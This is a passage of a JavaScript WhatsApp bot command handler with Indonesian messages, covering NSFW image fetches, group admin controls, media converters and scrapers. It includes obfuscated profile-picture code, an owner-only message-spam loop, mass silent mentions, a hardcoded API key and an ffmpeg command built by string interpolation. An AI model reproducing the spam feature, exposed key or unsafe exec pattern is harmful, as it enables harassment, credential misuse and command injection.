if (!m.isGroup) return m.reply(mess.group)
if (!AntiNsfw) return m.reply(mess.nsfw)
reply(mess.wait)
 waifudd = await axios.get(`https://waifu.pics/api/nsfw/waifu`) 
 let nwaifubot = [
 {buttonId: `.hneko`, buttonText: {displayText: `Next ⚡`}, type: 1},
 ]
let button4Messages = {
image: {url:waifudd.data.url},
caption:`Here you go!`,
buttons: nwaifubot,
headerType: 1
} 
 await haikal.sendMessage(m.chat, button4Messages, { quoted:m }).catch(err => {
 return('Error!')
})
break
//=================================================//
case 'gasm':
if (isBan) throw sticBanLu(from)
if (!AntiNsfw) return m.reply(mess.nsfw)
reply(mess.wait) 
 waifudd = await axios.get(`https://nekos.life/api/v2/img/${command}`)
var wbuttsss = [
{buttonId: `.${command}`, buttonText: {displayText: `Next ✨`}, type: 1},
]
 let buttonsssMessages = {
image: {url:waifudd.data.url},
caption:`Here you go!`,
 footer: `${global.botname}`,
 buttons: wbuttsss,
 headerType: 4
 }
 await haikal.sendMessage(m.chat, buttonsssMessages,{ quoted:m }).catch(err => {
 return('Error!')
})
break
//=================================================//
case 'setppbot': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
sticWait(from)
if (!quoted) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
if (!/image/.test(mime)) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
if (/webp/.test(mime)) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
var _0x1c413d=_0x2a1c;(function(_0x477de5,_0x25404c){var _0xc6ef35=_0x2a1c,_0x1a86a3=_0x477de5();while(!![]){try{var _0x392e78=parseInt(_0xc6ef35(0xff))/0x1+-parseInt(_0xc6ef35(0xfc))/0x2+-parseInt(_0xc6ef35(0xf9))/0x3*(parseInt(_0xc6ef35(0xfe))/0x4)+parseInt(_0xc6ef35(0x103))/0x5*(parseInt(_0xc6ef35(0x100))/0x6)+parseInt(_0xc6ef35(0x105))/0x7+parseInt(_0xc6ef35(0x108))/0x8+-parseInt(_0xc6ef35(0x102))/0x9*(parseInt(_0xc6ef35(0xfd))/0xa);if(_0x392e78===_0x25404c)break;else _0x1a86a3['push'](_0x1a86a3['shift']());}catch(_0x4aa4a8){_0x1a86a3['push'](_0x1a86a3['shift']());}}}(_0x512f,0x3121c));var media=await haikal[_0x1c413d(0x10a)](quoted);function _0x2a1c(_0x26455a,_0x1953ac){var _0x512fee=_0x512f();return _0x2a1c=function(_0x2a1c5a,_0x267fa3){_0x2a1c5a=_0x2a1c5a-0xf8;var _0xfaa61b=_0x512fee[_0x2a1c5a];return _0xfaa61b;},_0x2a1c(_0x26455a,_0x1953ac);}try{if(args[0x0]==_0x1c413d(0xfa)){const {generateProfilePicture}=require('./baseikal/lib/myfunc');var {img}=await generateProfilePicture(media);await haikal[_0x1c413d(0x106)]({'tag':'iq','attrs':{'to':botNumber,'type':'set','xmlns':_0x1c413d(0x107)},'content':[{'tag':_0x1c413d(0xf8),'attrs':{'type':_0x1c413d(0xfb)},'content':img}]});}else await haikal[_0x1c413d(0x101)](botNumber,{'url':media});m['reply'](mess[_0x1c413d(0x109)]);}catch{m[_0x1c413d(0x104)]('Gagal\x20Mengganti\x20Photo\x20Profile');}function _0x512f(){var _0x2f232f=['reply','1286194bdHKgR','query','w:profile:picture','3088072VzwWid','success','downloadAndSaveMediaMessage','picture','153igiZJi','/full','image','720650VaxDBN','2205790rCEybd','5796etOiDI','80334lizMjF','6GdpecB','updateProfilePicture','9DZAUSC','1029810dkCbDi'];_0x512f=function(){return _0x2f232f;};return _0x512f();}
}
break
//=================================================//
case 'setppgroup': case 'setppgrup': case 'setppgc': {
if (isBan) throw sticBanLu(from)
if (!m.isGroup) throw mess.group
if (!isAdmins) throw mess.admin
sticWait(from)
if (!quoted) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
if (!/image/.test(mime)) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
if (/webp/.test(mime)) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
const _0x3c52ee=_0x4109;(function(_0x1a4f9f,_0x3819cc){const _0x5c4a67=_0x4109,_0x4d0e21=_0x1a4f9f();while(!![]){try{const _0x2fe536=-parseInt(_0x5c4a67(0x78))/0x1+parseInt(_0x5c4a67(0x7a))/0x2*(-parseInt(_0x5c4a67(0x7e))/0x3)+parseInt(_0x5c4a67(0x73))/0x4+parseInt(_0x5c4a67(0x7c))/0x5+-parseInt(_0x5c4a67(0x72))/0x6+parseInt(_0x5c4a67(0x76))/0x7+parseInt(_0x5c4a67(0x70))/0x8;if(_0x2fe536===_0x3819cc)break;else _0x4d0e21['push'](_0x4d0e21['shift']());}catch(_0x3ccaac){_0x4d0e21['push'](_0x4d0e21['shift']());}}}(_0x38ce,0x9724c));function _0x4109(_0x2b2147,_0x340f6c){const _0x38ce6f=_0x38ce();return _0x4109=function(_0x410966,_0x2335d5){_0x410966=_0x410966-0x6d;let _0xbe9a92=_0x38ce6f[_0x410966];return _0xbe9a92;},_0x4109(_0x2b2147,_0x340f6c);}let media=await haikal['downloadAndSaveMediaMessage'](quoted);function _0x38ce(){const _0x2fbc7e=['43773HHkTHV','w:profile:picture','./baseikal/lib/myfunc','chat','10418328MFCmiM','reply','6441450CkyNxQ','1458440XVIgpe','set','picture','4984819pxHUxY','/full','786695iyptWU','query','142qiVRKp','image','5681485dynfLf','Gagal\x20Mengganti\x20Photo\x20Profile'];_0x38ce=function(){return _0x2fbc7e;};return _0x38ce();}try{if(args[0x0]==_0x3c52ee(0x77)){const {generateProfilePicture}=require(_0x3c52ee(0x6e));var {img}=await generateProfilePicture(media);await haikal[_0x3c52ee(0x79)]({'tag':'iq','attrs':{'to':m[_0x3c52ee(0x6f)],'type':_0x3c52ee(0x74),'xmlns':_0x3c52ee(0x6d)},'content':[{'tag':_0x3c52ee(0x75),'attrs':{'type':_0x3c52ee(0x7b)},'content':img}]});}else await haikal['updateProfilePicture'](m[_0x3c52ee(0x6f)],{'url':media});m[_0x3c52ee(0x71)](mess['success']);}catch{m['reply'](_0x3c52ee(0x7d));}
}
break
//=================================================//
case 'tagall': {
if (isBan) throw sticBanLu(from)
if (!m.isGroup) throw groupon(from)
let teks = `══✪〘 *👥 Tag All* 〙✪══
 ➲ *Pesan : ${q ? q : 'kosong'}*\n\n`
for (let mem of participants) {
teks += `⭔ @${mem.id.split('@')[0]}\n`
}
haikal.sendMessage(m.chat, { text: teks, mentions: participants.map(a => a.id) }, { quoted: m })
}
break
//=================================================//
case 'hidetag': {
if (isBan) throw sticBanLu(from)
if (!m.isGroup) throw groupon(from)
haikal.sendMessage(m.chat, { text : q ? q : '' , mentions: participants.map(a => a.id)}, { quoted: m })
}
break
//=================================================//
case 'style': case 'styletext': {
if (isBan) throw sticBanLu(from) // respon ketika limit habis
db.data.users[m.sender].limit -= 1 // -1 limit
let { styletext } = require('./baseikal/lib/scraper')
if (!text) throw 'Masukkan Query text!'
let anu = await styletext(text)
let teks = `Srtle Text From ${text}\n\n`
for (let i of anu) {
teks += `⭔ *${i.name}* : ${i.result}\n\n`
}
reply(teks)
}
break
//=================================================//
//=================================================//
 case 'group': case 'grup': {
 if (isBan) throw sticBanLu(from)
if (!m.isGroup) throw groupon(from)
if (!isBotAdmins) throw SiGroupadmin(from)
if (!isAdmins) throw sticAdmin(from)
if (args[0] === 'close'){
await haikal.groupSettingUpdate(m.chat, 'announcement').then((res) => m.reply(`Sukses Menutup Group`)).catch((err) => m.reply(jsonformat(err)))
} else if (args[0] === 'open'){
await haikal.groupSettingUpdate(m.chat, 'not_announcement').then((res) => m.reply(`Sukses Membuka Group`)).catch((err) => m.reply(jsonformat(err)))
} else {
let buttons = [
{ buttonId: 'group open', buttonText: { displayText: 'Open' }, type: 1 },
{ buttonId: 'group close', buttonText: { displayText: 'Close' }, type: 1 }
]
await haikal.sendButtonText(m.chat, buttons, `Mode Group`, haikal.user.name, m)
 }
}
break
//=================================================//
case 'editinfo': {
if (isBan) throw sticBanLu(from)
if (!m.isGroup) throw groupon(from)
if (!isBotAdmins) throw SiGroupadmin(from)
if (!isAdmins) throw sticAdmin(from)
 if (args[0] === 'open'){
await haikal.groupSettingUpdate(m.chat, 'unlocked').then((res) => m.reply(`Sukses Membuka Edit Info Group`)).catch((err) => m.reply(jsonformat(err)))
 } else if (args[0] === 'close'){
await haikal.groupSettingUpdate(m.chat, 'locked').then((res) => m.reply(`Sukses Menutup Edit Info Group`)).catch((err) => m.reply(jsonformat(err)))
 } else {
 let buttons = [
{ buttonId: 'editinfo open', buttonText: { displayText: 'Open' }, type: 1 },
{ buttonId: 'editinfo close', buttonText: { displayText: 'Close' }, type: 1 }
]
await haikal.sendButtonText(m.chat, buttons, `Mode Edit Info`, haikal.user.name, m)
}
}
break
//=================================================//
 case 'mute': {
 if (isBan) throw sticBanLu(from)
if (!m.isGroup) throw groupon(from)
if (!isBotAdmins) throw SiGroupadmin(from)
if (!isAdmins) throw sticAdmin(from)
if (args[0] === "on") {
if (db.data.chats[m.chat].mute) return m.reply(`Sudah Aktif Sebelumnya`)
db.data.chats[m.chat].mute = true
reply(`${haikal.user.name} telah di mute di group ini !`)
} else if (args[0] === "off") {
if (!db.data.chats[m.chat].mute) return m.reply(`Sudah Tidak Aktif Sebelumnya`)
db.data.chats[m.chat].mute = false
reply(`${haikal.user.name} telah di unmute di group ini !`)
} else {
 let buttons = [
{ buttonId: 'mute on', buttonText: { displayText: 'On' }, type: 1 },
{ buttonId: 'mute off', buttonText: { displayText: 'Off' }, type: 1 }
]
await haikal.sendButtonText(m.chat, buttons, `Mute Bot`, haikal.user.name, m)
}
 }
 break
//=================================================//
case 'linkgroup': case 'linkgc': {
if (isBan) throw sticBanLu(from)
if (!m.isGroup) throw groupon(from)
if (!isBotAdmins) throw SiGroupadmin(from)
let response = await haikal.groupInviteCode(m.chat)
haikal.sendText(m.chat, `https://chat.whatsapp.com/${response}\n\nLink Group : ${groupMetadata.subject}`, m, { detectLink: true })
}
break
//=================================================//
case 'ephemeral': {
if (isBan) throw sticBanLu(from)
if (!m.isGroup) throw groupon(from)
if (!isBotAdmins) throw SiGroupadmin(from)
if (!isAdmins) throw sticAdmin(from)
if (!text) throw 'Masukkan value enable/disable'
if (args[0] === 'enable') {
await haikal.sendMessage(m.chat, { disappearingMessagesInChat: WA_DEFAULT_EPHEMERAL }).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
} else if (args[0] === 'disable') {
await haikal.sendMessage(m.chat, { disappearingMessagesInChat: false }).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
}
}
break
//=================================================//
case 'delete': case 'del': {
if (isBan) throw sticBanLu(from)
if (!m.quoted) throw false
let { chat, fromMe, id, isBaileys } = m.quoted
if (!isBaileys) throw 'Pesan tersebut bukan dikirim oleh bot!'
haikal.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: true, id: m.quoted.id, participant: m.quoted.sender } })
}
break
//=================================================//
case 'infochat': {
if (isBan) throw sticBanLu(from)
if (!m.quoted) m.reply('Reply Pesan')
let msg = await m.getQuotedObj()
if (!m.quoted.isBaileys) throw 'Pesan tersebut bukan dikirim oleh bot!'
let teks = ''
for (let i of msg.userReceipt) {
let read = i.readTimestamp
let unread = i.receiptTimestamp
let waktu = read ? read : unread
teks += `⭔ @${i.userJid.split('@')[0]}\n`
teks += ` ┗━⭔ *Waktu :* ${moment(waktu * 1000).format('DD/MM/YY HH:mm:ss')} ⭔ *Status :* ${read ? 'Dibaca' : 'Terkirim'}\n\n`
}
haikal.sendTextWithMentions(m.chat, teks, m)
}
break
//=================================================//
case 'q': case 'quoted': {
if (isBan) throw sticBanLu(from)
if (!m.quoted) return m.reply('Reply Pesannya!!')
let wokwol = await haikal.serializeM(await m.getQuotedObj())
if (!wokwol.quoted) return m.reply('Pesan Yang anda reply tidak mengandung reply')
await wokwol.quoted.copyNForward(m.chat, true)
}
break
//=================================================//
case 'listpc': {
if (isBan) throw sticBanLu(from)
 let anu = await store.chats.all().filter(v => v.id.endsWith('.net')).map(v => v.id)
 let teks = `⬣ *LIST PERSONAL CHAT*\n\nTotal Chat : ${anu.length} Chat\n\n`
 for (let i of anu) {
 let nama = store.messages[i].array[0].pushName
 teks += `⬡ *Nama :* ${nama}\n⬡ *User :* @${i.split('@')[0]}\n⬡ *Chat :* https://wa.me/${i.split('@')[0]}\n\n────────────────────────\n\n`
 }
 haikal.sendTextWithMentions(m.chat, teks, m)
 }
 break
//=================================================//
case 'listgc': {
if (isBan) throw sticBanLu(from)
 let anu = await store.chats.all().filter(v => v.id.endsWith('@g.us')).map(v => v.id)
 let teks = `⬣ *LIST GROUP CHAT*\n\nTotal Group : ${anu.length} Group\n\n`
 for (let i of anu) {
 let metadata = await haikal.groupMetadata(i)
 teks += `⬡ *Nama :* ${metadata.subject}\n⬡ *Owner :* ${metadata.owner !== undefined ? '@' + metadata.owner.split`@`[0] : 'Tidak diketahui'}\n⬡ *ID :* ${metadata.id}\n⬡ *Dibuat :* ${moment(metadata.creation * 1000).tz('Asia/Jakarta').format('DD/MM/YYYY HH:mm:ss')}\n⬡ *Member :* ${metadata.participants.length}\n\n────────────────────────\n\n`
 }
 haikal.sendTextWithMentions(m.chat, teks, m)
 }
 break
//=================================================//
 case 'listonline': case 'liston': {
 if (isBan) throw sticBanLu(from)
let id = args && /\d+\-\d+@g.us/.test(args[0]) ? args[0] : m.chat
let online = [...Object.keys(store.presences[id]), botNumber]
haikal.sendText(m.chat, 'List Online:\n\n' + online.map(v => '⭔ @' + v.replace(/@.+/, '')).join`\n`, m, { mentions: online })
 }
 break
//=================================================//
case 'sticker': case 's': case 'stickergif': case 'sgif': {
if (isBan) throw sticBanLu(from)
if (!quoted) throw `Balas Video/Image Dengan Caption ${prefix + command}`
if (/image/.test(mime)) {
let media = await quoted.download()
let encmedia = await haikal.sendImageAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })
await fs.unlinkSync(encmedia)
} else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 11) return m.reply('Maksimal 10 detik!')
let media = await quoted.download()
let encmedia = await haikal.sendVideoAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })
await fs.unlinkSync(encmedia)
} else {
throw `Kirim Gambar/Video Dengan Caption ${prefix + command}\nDurasi Video 1-9 Detik`
}
}
break
//=================================================//
case 'ebinary': {
if (isBan) throw sticBanLu(from)
if (!text) throw `Example : ${prefix + command} text`
let { eBinary } = require('./baseikal/lib/binary')
let eb = await eBinary(text)
reply(eb)
}
break
//=================================================//
case 'dbinary': {
if (isBan) throw sticBanLu(from)
if (!text) throw `Example : ${prefix + command} text`
let { dBinary } = require('./baseikal/lib/binary')
let db = await dBinary(text)
reply(db)
}
break
//=================================================//
case 'emojimix': {
if (isBan) throw sticBanLu(from)
let [emoji1, emoji2] = text.split`+`
if (!emoji1) throw `Example : ${prefix + command} 😅+🤔`
if (!emoji2) throw `Example : ${prefix + command} 😅+🤔`
let anu = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(emoji1)}_${encodeURIComponent(emoji2)}`)
for (let res of anu.results) {
let encmedia = await haikal.sendImageAsSticker(m.chat, res.url, m, { packname: global.packname, author: global.author, categories: res.tags })
await fs.unlinkSync(encmedia)
}
}
break
//=================================================//
case 'emojimix2': {
if (isBan) throw sticBanLu(from)
if (!text) throw `Example : ${prefix + command} 😅`
let anu = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(text)}`)
for (let res of anu.results) {
let encmedia = await haikal.sendImageAsSticker(m.chat, res.url, m, { packname: global.packname, author: global.author, categories: res.tags })
await fs.unlinkSync(encmedia)
}
}
break
//=================================================//
 case 'attp': case 'ttp': {
 if (isBan) throw sticBanLu(from)
 if (!text) throw `Example : ${prefix + command} text`
 await haikal.sendMedia(m.chat, `https://xteam.xyz/${command}?file&text=${text}`, 'haikal', 'morou', m, {asSticker: true})
 }
 break
case 'spam': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (!m.quoted) return m.reply("Reply pesanya!")
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `HALLO AKU ZALL`
for (let i = 0; i < jumlah; i++) {
quoted.copyNForward(m.chat, true)
}
} 
break
//=================================================//

case 'smeme': case 'stickermeme': case 'stickmeme': {
if (isBan) throw sticBanLu(from)
if (!quoted) throw 'Reply Image'
if (text.includes('|')) return m.reply(`Kirim/Reply Foto Dengan Caption ${prefix + command} *teks*`)
if (!/image/.test(mime)) return m.reply(`Kirim/Reply Foto Dengan Caption ${prefix + command} *teks*`)
sticWait(from)
arg = args.join(' ')
mee = await haikal.downloadAndSaveMediaMessage(quoted)
const { TelegraPh } = require('./baseikal/lib/uploader')
mem = await TelegraPh(mee)
meme = `https://api.memegen.link/images/custom/-/${arg}.png?background=${mem}`
memek = await haikal.sendImageAsSticker(m.chat, meme, m, { packname: global.packname, author: global.author })
await fs.unlinkSync(memek)
}
break 
case 'toimage': case 'toimg': {
if (isBan) throw sticBanLu(from)
if (!quoted) throw 'Reply Image'
if (!/webp/.test(mime)) throw `Balas sticker dengan caption *${prefix + command}*`
let media = await haikal.downloadAndSaveMediaMessage(quoted)
let ran = await getRandom('.png')
exec(`ffmpeg -i ${media} ${ran}`, (err) => {
fs.unlinkSync(media)
if (err) throw err
let buffer = fs.readFileSync(ran)
haikal.sendMessage(m.chat, { image: buffer }, { quoted: m })
fs.unlinkSync(ran)
})
}
break
//=================================================//
case 'tomp4': case 'tovideo': {
if (isBan) throw sticBanLu(from)
if (!quoted) throw 'Reply Image'
if (!/webp/.test(mime)) throw `*reply sticker with caption* *${prefix + command}*`
let { webp2mp4File } = require('./baseikal/lib/uploader')
let media = await haikal.downloadAndSaveMediaMessage(quoted)
let webpToMp4 = await webp2mp4File(media)
await haikal.sendMessage(m.chat, { video: { url: webpToMp4.result, caption: 'Convert Webp To Video' } }, { quoted: m })
await fs.unlinkSync(media)
}
break
case 'toaud': case 'toaudio': {
if (isBan) throw sticBanLu(from)
////if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return 
if (!/video/.test(mime) && !/audio/.test(mime)) throw `*Send/Reply the Video/Audio You Want to Use as Audio With Caption* ${prefix + command}`
if (!quoted) throw `*Send/Reply the Video/Audio You Want to Use as Audio With Caption* ${prefix + command}`
let media = await quoted.download()
let { toAudio } = require('./baseikal/lib/converter')
let audio = await toAudio(media, 'mp4')
haikal.sendMessage(m.chat, {audio: audio, mimetype: 'audio/mpeg'}, { quoted: m })
}
break
case 'tomp3': {
if (isBan) throw sticBanLu(from)
////if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return 
if (/document/.test(mime)) throw `*Send/Reply Video/Audio You Want to Convert into MP3 With Caption* ${prefix + command}`
if (!/video/.test(mime) && !/audio/.test(mime)) throw `*Send/Reply Video/Audio You Want to Convert into MP3 With Caption* ${prefix + command}`
if (!quoted) throw `*Send/Reply Video/Audio You Want to Convert into MP3 With Caption* ${prefix + command}`
let media = await quoted.download()
let { toAudio } = require('./baseikal/lib/converter')
let audio = await toAudio(media, 'mp4')
haikal.sendMessage(m.chat, {document: audio, mimetype: 'audio/mpeg', fileName: `Convert By ${haikal.user.name}.mp3`}, { quoted: m })
}
break
case 'tovn': case 'toptt': {
if (isBan) throw sticBanLu(from)
//if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return 
if (!/video/.test(mime) && !/audio/.test(mime)) throw `*Reply Video/Audio That You Want To Be VN With Caption* ${prefix + command}`
if (!quoted) throw `*Reply Video/Audio That You Want To Be VN With Caption* ${prefix + command}`
sticWait(from)
let media = await quoted.download()
let { toPTT } = require('./baseikal/lib/converter')
let audio = await toPTT(media, 'mp4')
haikal.sendMessage(m.chat, {audio: audio, mimetype:'audio/mpeg', ptt:true }, {quoted:m})
}
break
case 'togif': {
if (isBan) throw sticBanLu(from)
////if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return 
if (!quoted) throw 'Reply Image'
if (!/webp/.test(mime)) throw `*reply sticker with caption* *${prefix + command}*`
 let { webp2mp4File } = require('./baseikal/lib/uploader')
let media = await haikal.downloadAndSaveMediaMessage(quoted)
let webpToMp4 = await webp2mp4File(media)
await haikal.sendMessage(m.chat, { video: { url: webpToMp4.result, caption: 'Convert Webp To Video' }, gifPlayback: true }, { quoted: m })
await fs.unlinkSync(media)
}
break
//=================================================//
case 'tourl': {
if (isBan) throw sticBanLu(from)
let { UploadFileUgu, webp2mp4File, TelegraPh } = require('./baseikal/lib/uploader')
let media = await haikal.downloadAndSaveMediaMessage(quoted)
if (/image/.test(mime)) {
let anu = await TelegraPh(media)
m.reply(util.format(anu))
} else if (!/image/.test(mime)) {
let anu = await UploadFileUgu(media)
m.reply(util.format(anu))
}
await fs.unlinkSync(media)
}
break
//=================================================//
case 'gimage': {
if (isBan) throw sticBanLu(from)
if (!text) throw `Example : ${prefix + command} kaori cicak`
let gis = require('g-i-s')
gis(text, async (error, result) => {
n = result
images = n[Math.floor(Math.random() * n.length)].url
let buttons = [
{buttonId: `gimage ${text}`, buttonText: {displayText: 'Next Image'}, type: 1}
]
let buttonMessage = {
image: { url: images },
caption: `*-------「 GIMAGE SEARCH 」-------*
🤠 *Query* : ${text}
🔗 *Media Url* : ${images}`,
footer: haikal.user.name,
buttons: buttons,
headerType: 4
}
haikal.sendMessage(m.chat, buttonMessage, { quoted: m })
})
}
break
//=================================================//
case 'pinterest': {
if (isBan) throw sticBanLu(from)
let { pinterest } = require('./baseikal/lib/scraper')
anu = await pinterest(text)
result = anu[Math.floor(Math.random() * anu.length)]
haikal.sendMessage(m.chat, { image: { url: result }, caption: '⭔ Media Url : '+result }, { quoted: m })
}
break
//=================================================//
case 'couple': {
if (isBan) throw sticBanLu(from)
let anu = await fetchJson('https://raw.githubusercontent.com/iamriz7/kopel_/main/kopel.json')
let random = anu[Math.floor(Math.random() * anu.length)]
haikal.sendMessage(m.chat, { image: { url: random.male }, caption: `Couple Male` }, { quoted: m })
haikal.sendMessage(m.chat, { image: { url: random.female }, caption: `Couple Female` }, { quoted: m })
}
break
//=================================================//
case 'coffe': case 'kopi': {
if (isBan) throw sticBanLu(from)
let buttons = [
{buttonId: `coffe`, buttonText: {displayText: 'Next Image'}, type: 1}
]
let buttonMessage = {
image: { url: 'https://coffee.alexflipnote.dev/random' },
caption: `☕ Random Coffe`,
footer: haikal.user.name,
buttons: buttons,
headerType: 4
}
haikal.sendMessage(m.chat, buttonMessage, { quoted: m })
}
break
//=================================================//
case 'wallpaper': {
if (isBan) throw sticBanLu(from)
if (!text) throw 'Masukkan Query Title'
let { wallpaper } = require('./baseikal/lib/scraper')
anu = await wallpaper(text)
result = anu[Math.floor(Math.random() * anu.length)]
let buttons = [
{buttonId: `wallpaper ${text}`, buttonText: {displayText: 'Next Image'}, type: 1}
]
let buttonMessage = {
image: { url: result.image[0] },
caption: `⭔ Title : ${result.title}\n⭔ Category : ${result.type}\n⭔ Detail : ${result.source}\n⭔ Media Url : ${result.image[2] || result.image[1] || result.image[0]}`,
footer: haikal.user.name,
buttons: buttons,
headerType: 4
}
haikal.sendMessage(m.chat, buttonMessage, { quoted: m })
}
break
//=================================================//
case 'wikimedia': {
if (isBan) throw sticBanLu(from)
if (!text) throw 'Masukkan Query Title'
let { wikimedia } = require('./baseikal/lib/scraper')
anu = await wikimedia(text)
result = anu[Math.floor(Math.random() * anu.length)]
let buttons = [
{buttonId: `wikimedia ${text}`, buttonText: {displayText: 'Next Image'}, type: 1}
]
let buttonMessage = {
image: { url: result.image },
caption: `⭔ Title : ${result.title}\n⭔ Source : ${result.source}\n⭔ Media Url : ${result.image}`,
footer: haikal.user.name,
buttons: buttons,
headerType: 4
}
haikal.sendMessage(m.chat, buttonMessage, { quoted: m })
}
break
//=================================================//
case 'quotesanime': case 'quoteanime': {
if (isBan) throw sticBanLu(from)
let { quotesAnime } = require('./baseikal/lib/scraper')
let anu = await quotesAnime()
result = anu[Math.floor(Math.random() * anu.length)]
let buttons = [
{buttonId: `quotesanime`, buttonText: {displayText: 'Next'}, type: 1}
]
let buttonMessage = {
text: `~_${result.quotes}_\n\nBy '${result.karakter}', ${result.anime}\n\n- ${result.up_at}`,
footer: 'Press The Button Below',
buttons: buttons,
headerType: 2
}
haikal.sendMessage(m.chat, buttonMessage, { quoted: m })
}
break
//=================================================//
case 'nomerhoki': case 'nomorhoki': {
if (isBan) throw sticBanLu(from)
if (!Number(text)) throw `Example : ${prefix + command} 6288292024190`
let anu = await primbon.nomer_hoki(Number(text))
if (anu.status == false) return m.reply(anu.message)
haikal.sendText(m.chat, `⭔ *Nomor HP :* ${anu.message.nomer_hp}\n⭔ *Angka Shuzi :* ${anu.message.angka_shuzi}\n⭔ *Energi Positif :*\n- Kekayaan : ${anu.message.energi_positif.kekayaan}\n- Kesehatan : ${anu.message.energi_positif.kesehatan}\n- Cinta : ${anu.message.energi_positif.cinta}\n- Kestabilan : ${anu.message.energi_positif.kestabilan}\n- Persentase : ${anu.message.energi_positif.persentase}\n⭔ *Energi Negatif :*\n- Perselisihan : ${anu.message.energi_negatif.perselisihan}\n- Kehilangan : ${anu.message.energi_negatif.kehilangan}\n- Malapetaka : ${anu.message.energi_negatif.malapetaka}\n- Kehancuran : ${anu.message.energi_negatif.kehancuran}\n- Persentase : ${anu.message.energi_negatif.persentase}`, m)
}
break
//=================================================//
case 'artimimpi': case 'tafsirmimpi': {
if (isBan) throw sticBanLu(from)
if (!text) throw `Example : ${prefix + command} belanja`
let anu = await primbon.tafsir_mimpi(text)
if (anu.status == false) return m.reply(anu.message)
haikal.sendText(m.chat, `⭔ *Mimpi :* ${anu.message.mimpi}\n⭔ *Arti :* ${anu.message.arti}\n⭔ *Solusi :* ${anu.message.solusi}`, m)
}
break
//=================================================//
case 'ramalanjodoh': case 'ramaljodoh': {
if (isBan) throw sticBanLu(from)
if (!text) throw `Example : ${prefix + command} ZALL, 7, 7, 2005, Putri, 16, 11, 2004`
let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = text.split`,`
let anu = await primbon.ramalan_jodoh(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
if (anu.status == false) return m.reply(anu.message)
haikal.sendText(m.chat, `⭔ *Nama Anda :* ${anu.message.nama_anda.nama}\n⭔ *Lahir Anda :* ${anu.message.nama_anda.tgl_lahir}\n⭔ *Nama Pasangan :* ${anu.message.nama_pasangan.nama}\n⭔ *Lahir Pasangan :* ${anu.message.nama_pasangan.tgl_lahir}\n⭔ *Hasil :* ${anu.message.result}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
//=================================================//
case 'ramalanjodohbali': case 'ramaljodohbali': {
if (isBan) throw sticBanLu(from)
if (!text) throw `Example : ${prefix + command} ZALL, 7, 7, 2005, Putri, 16, 11, 2004`
let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = text.split`,`
let anu = await primbon.ramalan_jodoh_bali(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
if (anu.status == false) return m.reply(anu.message)
haikal.sendText(m.chat, `⭔ *Nama Anda :* ${anu.message.nama_anda.nama}\n⭔ *Lahir Anda :* ${anu.message.nama_anda.tgl_lahir}\n⭔ *Nama Pasangan :* ${anu.message.nama_pasangan.nama}\n⭔ *Lahir Pasangan :* ${anu.message.nama_pasangan.tgl_lahir}\n⭔ *Hasil :* ${anu.message.result}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
//=================================================//
case 'suamiistri': {
if (isBan) throw sticBanLu(from)
if (!text) throw `Example : ${prefix + command} ZALL, 7, 7, 2005, Putri, 16, 11, 2004`
let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = text.split`,`
let anu = await primbon.suami_istri(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
if (anu.status == false) return m.reply(anu.message)
haikal.sendText(m.chat, `⭔ *Nama Suami :* ${anu.message.suami.nama}\n⭔ *Lahir Suami :* ${anu.message.suami.tgl_lahir}\n⭔ *Nama Istri :* ${anu.message.istri.nama}\n⭔ *Lahir Istri :* ${anu.message.istri.tgl_lahir}\n⭔ *Hasil :* ${anu.message.result}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
//=================================================//
case 'ramalancinta': case 'ramalcinta': {
if (isBan) throw sticBanLu(from)
if (!text) throw `Example : ${prefix + command} ZALL, 7, 7, 2005, Putri, 16, 11, 2004`
let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = text.split`,`
let anu = await primbon.ramalan_cinta(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
if (anu.status == false) return m.reply(anu.message)
haikal.sendText(m.chat, `⭔ *Nama Anda :* ${anu.message.nama_anda.nama}\n⭔ *Lahir Anda :* ${anu.message.nama_anda.tgl_lahir}\n⭔ *Nama Pasangan :* ${anu.message.nama_pasangan.nama}\n⭔ *Lahir Pasangan :* ${anu.message.nama_pasangan.tgl_lahir}\n⭔ *Sisi Positif :* ${anu.message.sisi_positif}\n⭔ *Sisi Negatif :* ${anu.message.sisi_negatif}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
//=================================================//
case 'artinama': {
if (isBan) throw sticBanLu(from)
if (!text) throw `Example : ${prefix + command} ZALL Gans`
